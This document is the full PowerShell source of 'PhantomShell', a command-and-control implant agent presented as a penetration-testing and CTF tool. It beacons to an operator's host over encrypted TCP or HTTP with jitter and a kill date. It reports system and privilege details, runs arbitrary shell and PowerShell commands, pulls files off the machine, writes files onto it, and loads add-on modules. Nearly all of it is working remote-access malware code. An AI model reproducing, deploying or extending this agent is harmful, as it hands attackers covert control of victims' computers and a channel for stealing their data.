# PhantomShell v5.2 - PowerShell Agent
# ============================================================
# AUTHORIZED USE ONLY - This tool is designed for authorized
# penetration testing and CTF competitions. Unauthorized access
# to computer systems is illegal. The authors assume no
# liability for misuse of this software.
# ============================================================

[CmdletBinding()]
param(
    [string]$C2Host = "0.0.0.0",
    [int]$C2Port = 4444,
    [int]$Sleep = 5,
    [int]$Jitter = 20,
    [string]$KillDate = "",
    [ValidateSet("tcp", "http")]
    [string]$Transport = "tcp",
    [switch]$NoEncrypt
)

# --- Globals ---
$Script:AgentId = ""
$Script:PSK = if ($env:PS_AUTH_KEY) { $env:PS_AUTH_KEY } else { "phantomshell-default-key" }
$Script:SessionKey = $null
$Script:Sequence = 0
$Script:Dispatcher = @{}
$Script:Running = $true

# --- Utility: Generate Agent ID ---
function New-AgentId {
    $bytes = New-Object byte[] 6
    [System.Security.Cryptography.RandomNumberGenerator]::Create().GetBytes($bytes)
    return "ps-" + ([BitConverter]::ToString($bytes) -replace '-','').ToLower()
}

# --- Utility: HMAC-SHA256 ---
function Get-HMACSHA256 {
    param([string]$Key, [string]$Message)
    $keyBytes = [System.Text.Encoding]::UTF8.GetBytes($Key)
    $msgBytes = [System.Text.Encoding]::UTF8.GetBytes($Message)
    $hmac = New-Object System.Security.Cryptography.HMACSHA256
    $hmac.Key = $keyBytes
    $hash = $hmac.ComputeHash($msgBytes)
    return [BitConverter]::ToString($hash) -replace '-',''
}

# --- Utility: New UUID ---
function New-MessageId {
    return [guid]::NewGuid().ToString()
}

# --- Utility: Unix timestamp ---
function Get-Timestamp {
    return [int][double]::Parse((Get-Date -UFormat %s))
}

# --- Encryption: AES-256-GCM (PS 7+) with AES-CBC fallback (PS 5.1) ---
function Protect-Data {
    param([byte[]]$Plaintext, [byte[]]$Key)

    if ($NoEncrypt) { return $Plaintext }

    if ($PSVersionTable.PSVersion.Major -ge 7) {
        # AES-256-GCM via .NET AesGcm
        $nonce = New-Object byte[] 12
        [System.Security.Cryptography.RandomNumberGenerator]::Create().GetBytes($nonce)
        $ciphertext = New-Object byte[] $Plaintext.Length
        $tag = New-Object byte[] 16
        $aesGcm = [System.Security.Cryptography.AesGcm]::new($Key)
        $aesGcm.Encrypt($nonce, $Plaintext, $ciphertext, $tag, $null)
        $aesGcm.Dispose()
        # Format: nonce(12) + tag(16) + ciphertext
        $result = New-Object byte[] ($nonce.Length + $tag.Length + $ciphertext.Length)
        [Buffer]::BlockCopy($nonce, 0, $result, 0, 12)
        [Buffer]::BlockCopy($tag, 0, $result, 12, 16)
        [Buffer]::BlockCopy($ciphertext, 0, $result, 28, $ciphertext.Length)
        return $result
    }
    else {
        # AES-256-CBC fallback
        $aes = [System.Security.Cryptography.Aes]::Create()
        $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
        $aes.KeySize = 256
        $aes.Key = $Key
        $aes.GenerateIV()
        $encryptor = $aes.CreateEncryptor()
        $ciphertext = $encryptor.TransformFinalBlock($Plaintext, 0, $Plaintext.Length)
        # Format: iv(16) + ciphertext
        $result = New-Object byte[] ($aes.IV.Length + $ciphertext.Length)
        [Buffer]::BlockCopy($aes.IV, 0, $result, 0, $aes.IV.Length)
        [Buffer]::BlockCopy($ciphertext, 0, $result, $aes.IV.Length, $ciphertext.Length)
        $aes.Dispose()
        return $result
    }
}

function Unprotect-Data {
    param([byte[]]$CipherData, [byte[]]$Key)

    if ($NoEncrypt) { return $CipherData }

    if ($PSVersionTable.PSVersion.Major -ge 7) {
        # AES-256-GCM
        $nonce = New-Object byte[] 12
        $tag = New-Object byte[] 16
        $ciphertext = New-Object byte[] ($CipherData.Length - 28)
        [Buffer]::BlockCopy($CipherData, 0, $nonce, 0, 12)
        [Buffer]::BlockCopy($CipherData, 12, $tag, 0, 16)
        [Buffer]::BlockCopy($CipherData, 28, $ciphertext, 0, $ciphertext.Length)
        $plaintext = New-Object byte[] $ciphertext.Length
        $aesGcm = [System.Security.Cryptography.AesGcm]::new($Key)
        $aesGcm.Decrypt($nonce, $ciphertext, $tag, $plaintext, $null)
        $aesGcm.Dispose()
        return $plaintext
    }
    else {
        # AES-256-CBC
        $iv = New-Object byte[] 16
        $ciphertext = New-Object byte[] ($CipherData.Length - 16)
        [Buffer]::BlockCopy($CipherData, 0, $iv, 0, 16)
        [Buffer]::BlockCopy($CipherData, 16, $ciphertext, 0, $ciphertext.Length)
        $aes = [System.Security.Cryptography.Aes]::Create()
        $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
        $aes.KeySize = 256
        $aes.Key = $Key
        $aes.IV = $iv
        $decryptor = $aes.CreateDecryptor()
        $plaintext = $decryptor.TransformFinalBlock($ciphertext, 0, $ciphertext.Length)
        $aes.Dispose()
        return $plaintext
    }
}

function New-SessionKey {
    $key = New-Object byte[] 32
    [System.Security.Cryptography.RandomNumberGenerator]::Create().GetBytes($key)
    return $key
}

# --- System Info Collection ---
function Get-SystemInfo {
    $isAdmin = $false
    try {
        $identity = [Security.Principal.WindowsIdentity]::GetCurrent()
        $principal = New-Object Security.Principal.WindowsPrincipal($identity)
        $isAdmin = $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
    } catch {}

    $integrity = "Medium"
    if ($isAdmin) { $integrity = "High" }

    return @{
        hostname  = [System.Net.Dns]::GetHostName()
        user      = [Environment]::UserName
        domain    = [Environment]::UserDomainName
        os        = [Environment]::OSVersion.VersionString
        arch      = [Environment]::Is64BitOperatingSystem ? "x64" : "x86"
        pid       = $PID
        integrity = $integrity
        is_admin  = $isAdmin
        ps_version = $PSVersionTable.PSVersion.ToString()
        clr_version = [Environment]::Version.ToString()
    }
}

# --- Wire Protocol: TCP Transport ---
function Send-Message {
    param(
        [System.Net.Sockets.NetworkStream]$Stream,
        [hashtable]$Msg
    )

    $Script:Sequence++
    $Msg["sequence"] = $Script:Sequence
    $Msg["timestamp"] = Get-Timestamp
    $Msg["agent_id"] = $Script:AgentId
    if (-not $Msg["message_id"]) { $Msg["message_id"] = New-MessageId }

    $json = $Msg | ConvertTo-Json -Depth 10 -Compress
    $payload = [System.Text.Encoding]::UTF8.GetBytes($json)

    # Encrypt if session key is established and encryption enabled
    if ($Script:SessionKey -and -not $NoEncrypt) {
        $payload = Protect-Data -Plaintext $payload -Key $Script:SessionKey
    }

    # 4-byte big-endian length prefix
    $lenBytes = [BitConverter]::GetBytes([uint32]$payload.Length)
    if ([BitConverter]::IsLittleEndian) { [Array]::Reverse($lenBytes) }

    $Stream.Write($lenBytes, 0, 4)
    $Stream.Write($payload, 0, $payload.Length)
    $Stream.Flush()
}

function Receive-Message {
    param([System.Net.Sockets.NetworkStream]$Stream)

    # Read 4-byte length prefix
    $lenBuf = New-Object byte[] 4
    $read = 0
    while ($read -lt 4) {
        $n = $Stream.Read($lenBuf, $read, 4 - $read)
        if ($n -eq 0) { throw "Connection closed" }
        $read += $n
    }
    if ([BitConverter]::IsLittleEndian) { [Array]::Reverse($lenBuf) }
    $payloadLen = [BitConverter]::ToUInt32($lenBuf, 0)

    if ($payloadLen -gt 10485760) { throw "Payload too large: $payloadLen" }

    # Read payload
    $payload = New-Object byte[] $payloadLen
    $read = 0
    while ($read -lt $payloadLen) {
        $n = $Stream.Read($payload, $read, $payloadLen - $read)
        if ($n -eq 0) { throw "Connection closed during payload read" }
        $read += $n
    }

    # Decrypt if session key established
    if ($Script:SessionKey -and -not $NoEncrypt) {
        $payload = Unprotect-Data -CipherData $payload -Key $Script:SessionKey
    }

    $json = [System.Text.Encoding]::UTF8.GetString($payload)
    return ($json | ConvertFrom-Json)
}

# --- Wire Protocol: HTTP Transport ---
function Send-HTTPMessage {
    param([hashtable]$Msg)

    $Script:Sequence++
    $Msg["sequence"] = $Script:Sequence
    $Msg["timestamp"] = Get-Timestamp
    $Msg["agent_id"] = $Script:AgentId
    if (-not $Msg["message_id"]) { $Msg["message_id"] = New-MessageId }

    $json = $Msg | ConvertTo-Json -Depth 10 -Compress
    $payload = [System.Text.Encoding]::UTF8.GetBytes($json)

    if ($Script:SessionKey -and -not $NoEncrypt) {
        $payload = Protect-Data -Plaintext $payload -Key $Script:SessionKey
        $body = [Convert]::ToBase64String($payload)
    } else {
        $body = $json
    }

    $url = "http://${C2Host}:${C2Port}/api/agent"
    try {
        $resp = Invoke-RestMethod -Uri $url -Method Post -Body $body -ContentType "application/json" -ErrorAction Stop
        return $resp
    } catch {
        return $null
    }
}

function Receive-HTTPMessage {
    $url = "http://${C2Host}:${C2Port}/api/task/${Script:AgentId}"
    try {
        $resp = Invoke-RestMethod -Uri $url -Method Get -ErrorAction Stop
        if ($resp -and $resp.type) { return $resp }
    } catch {}
    return $null
}

# --- Task Dispatcher ---
function Invoke-Task {
    param($Task)

    $command = $Task.payload.command
    $taskArgs = $Task.payload.args

    # Check dispatcher for registered module commands
    if ($Script:Dispatcher.ContainsKey($command)) {
        try {
            $handler = $Script:Dispatcher[$command].Handler
            $result = & $handler $taskArgs
            return @{ status = "ok"; data = $result }
        } catch {
            return @{ status = "error"; output = $_.Exception.Message }
        }
    }

    # Built-in commands
    switch ($command) {
        "shell" {
            try {
                $output = Invoke-Expression $taskArgs.command 2>&1 | Out-String
                return @{ status = "ok"; output = $output.Trim() }
            } catch {
                return @{ status = "error"; output = $_.Exception.Message }
            }
        }
        "powershell" {
            try {
                $sb = [scriptblock]::Create($taskArgs.code)
                $output = & $sb 2>&1 | Out-String
                return @{ status = "ok"; output = $output.Trim() }
            } catch {
                return @{ status = "error"; output = $_.Exception.Message }
            }
        }
        "download" {
            try {
                $bytes = [IO.File]::ReadAllBytes($taskArgs.path)
                $b64 = [Convert]::ToBase64String($bytes)
                return @{ status = "ok"; filename = [IO.Path]::GetFileName($taskArgs.path); data = $b64; size = $bytes.Length }
            } catch {
                return @{ status = "error"; output = $_.Exception.Message }
            }
        }
        "upload" {
            try {
                $bytes = [Convert]::FromBase64String($taskArgs.data)
                [IO.File]::WriteAllBytes($taskArgs.path, $bytes)
                return @{ status = "ok"; output = "Written $($bytes.Length) bytes to $($taskArgs.path)" }
            } catch {
                return @{ status = "error"; output = $_.Exception.Message }
            }
        }
        "sysinfo" {
            return @{ status = "ok"; data = (Get-SystemInfo) }
        }
        "pwd" {
            return @{ status = "ok"; output = (Get-Location).Path }
        }
        "cd" {
            try {
                Set-Location $taskArgs.path
                return @{ status = "ok"; output = (Get-Location).Path }
            } catch {
                return @{ status = "error"; output = $_.Exception.Message }
            }
        }
        "ls" {
            try {
                $path = if ($taskArgs.path) { $taskArgs.path } else { "." }
                $items = Get-ChildItem -Path $path -Force | Select-Object Name, Length, Mode, LastWriteTime
                return @{ status = "ok"; data = $items }
            } catch {
                return @{ status = "error"; output = $_.Exception.Message }
            }
        }
        "ps" {
            try {
                $procs = Get-Process | Select-Object Id, ProcessName, Path, @{N='Memory';E={$_.WorkingSet64}} | Sort-Object Memory -Descending | Select-Object -First 50
                return @{ status = "ok"; data = $procs }
            } catch {
                return @{ status = "error"; output = $_.Exception.Message }
            }
        }
        "sleep" {
            $Script:SleepTime = [int]$taskArgs.time
            if ($taskArgs.jitter) { $Script:JitterPct = [int]$taskArgs.jitter }
            return @{ status = "ok"; output = "Sleep set to $($Script:SleepTime)s, jitter $($Script:JitterPct)%" }
        }
        "die" {
            $Script:Running = $false
            return @{ status = "ok"; output = "Agent exiting" }
        }
        "modules" {
            $mods = $Script:Dispatcher.Keys | ForEach-Object {
                @{ command = $_; description = $Script:Dispatcher[$_].Description }
            }
            return @{ status = "ok"; data = $mods }
        }
        default {
            return @{ status = "error"; output = "Unknown command: $command" }
        }
    }
}

# --- Module Loader ---
function Import-AgentModules {
    $modulePath = Join-Path $PSScriptRoot "Modules"
    if (-not (Test-Path $modulePath)) { return }

    Get-ChildItem -Path $modulePath -Filter "*.ps1" | ForEach-Object {
        try {
            . $_.FullName
            if ($ModuleCommands -and $ModuleCommands -is [hashtable]) {
                foreach ($key in $ModuleCommands.Keys) {
                    $Script:Dispatcher[$key] = $ModuleCommands[$key]
                }
                Write-Verbose "Loaded module: $($_.BaseName) ($($ModuleCommands.Count) commands)"
            }
        } catch {
            Write-Warning "Failed to load module $($_.Name): $($_.Exception.Message)"
        }
    }
}

# --- Sleep with Jitter ---
function Get-SleepInterval {
    $base = $Script:SleepTime
    $jitter = $Script:JitterPct
    if ($jitter -le 0) { return $base }
    $variance = [math]::Floor($base * $jitter / 100)
    $min = [math]::Max(1, $base - $variance)
    $max = $base + $variance
    return (Get-Random -Minimum $min -Maximum ($max + 1))
}

# --- Kill Date Check ---
function Test-KillDate {
    if (-not $Script:KillDateValue) { return $false }
    return ((Get-Date) -gt $Script:KillDateValue)
}

# --- Main Entry Point ---
function Start-Agent {
    $Script:AgentId = New-AgentId
    $Script:SleepTime = $Sleep
    $Script:JitterPct = $Jitter
    $Script:KillDateValue = $null
    $Script:SessionKey = New-SessionKey

    if ($KillDate) {
        try { $Script:KillDateValue = [datetime]::Parse($KillDate) } catch {}
    }

    # Load modules
    Import-AgentModules

    # Build register message
    $authToken = Get-HMACSHA256 -Key $Script:PSK -Message $Script:AgentId
    $sysInfo = Get-SystemInfo

    $registerMsg = @{
        message_id = New-MessageId
        type       = "register"
        payload    = @{
            auth     = $authToken
            info     = $sysInfo
            key      = [Convert]::ToBase64String($Script:SessionKey)
            encrypt  = (-not $NoEncrypt)
        }
    }

    if ($Transport -eq "tcp") {
        Start-TCPAgent -RegisterMsg $registerMsg
    } else {
        Start-HTTPAgent -RegisterMsg $registerMsg
    }
}

# --- TCP Agent Loop ---
function Start-TCPAgent {
    param([hashtable]$RegisterMsg)

    while ($Script:Running) {
        $client = $null
        $stream = $null
        try {
            $client = New-Object System.Net.Sockets.TcpClient
            $client.Connect($C2Host, $C2Port)
            $stream = $client.GetStream()
            $stream.ReadTimeout = 30000

            # Register (sent unencrypted; server doesn't have key yet)
            $savedKey = $Script:SessionKey
            $Script:SessionKey = $null
            Send-Message -Stream $stream -Msg $RegisterMsg
            $regResp = Receive-Message -Stream $stream
            $Script:SessionKey = $savedKey

            if (-not $regResp -or $regResp.type -ne "register" -or $regResp.payload.status -ne "ok") {
                throw "Registration failed"
            }

            # Beacon/task loop
            while ($Script:Running) {
                if (Test-KillDate) {
                    $Script:Running = $false
                    break
                }

                # Send beacon
                $beaconMsg = @{
                    message_id = New-MessageId
                    type       = "beacon"
                    payload    = @{}
                }
                Send-Message -Stream $stream -Msg $beaconMsg
                $taskMsg = Receive-Message -Stream $stream

                if ($taskMsg -and $taskMsg.type -eq "task") {
                    $result = Invoke-Task -Task $taskMsg
                    $responseMsg = @{
                        message_id = New-MessageId
                        type       = "response"
                        payload    = @{
                            task_id = $taskMsg.message_id
                            result  = $result
                        }
                    }
                    Send-Message -Stream $stream -Msg $responseMsg
                }

                $interval = Get-SleepInterval
                Start-Sleep -Seconds $interval
            }
        } catch {
            # Reconnect on failure
            Start-Sleep -Seconds (Get-SleepInterval)
        } finally {
            if ($stream) { try { $stream.Close() } catch {} }
            if ($client) { try { $client.Close() } catch {} }
        }
    }
}

# --- HTTP Agent Loop ---
function Start-HTTPAgent {
    param([hashtable]$RegisterMsg)

    # Register
    $savedKey = $Script:SessionKey
    $Script:SessionKey = $null
    $regResp = Send-HTTPMessage -Msg $RegisterMsg
    $Script:SessionKey = $savedKey

    if (-not $regResp) {
        Start-Sleep -Seconds (Get-SleepInterval)
        return
    }

    # Beacon/task loop
    while ($Script:Running) {
        if (Test-KillDate) {
            $Script:Running = $false
            break
        }

        try {
            $beaconMsg = @{
                message_id = New-MessageId
                type       = "beacon"
                payload    = @{}
            }
            $taskResp = Send-HTTPMessage -Msg $beaconMsg

            if ($taskResp -and $taskResp.type -eq "task") {
                $result = Invoke-Task -Task $taskResp
                $responseMsg = @{
                    message_id = New-MessageId
                    type       = "response"
                    payload    = @{
                        task_id = $taskResp.message_id
                        result  = $result
                    }
                }
                Send-HTTPMessage -Msg $responseMsg | Out-Null
            }
        } catch {}

        $interval = Get-SleepInterval
        Start-Sleep -Seconds $interval
    }
}

# --- Launch ---
Start-Agent
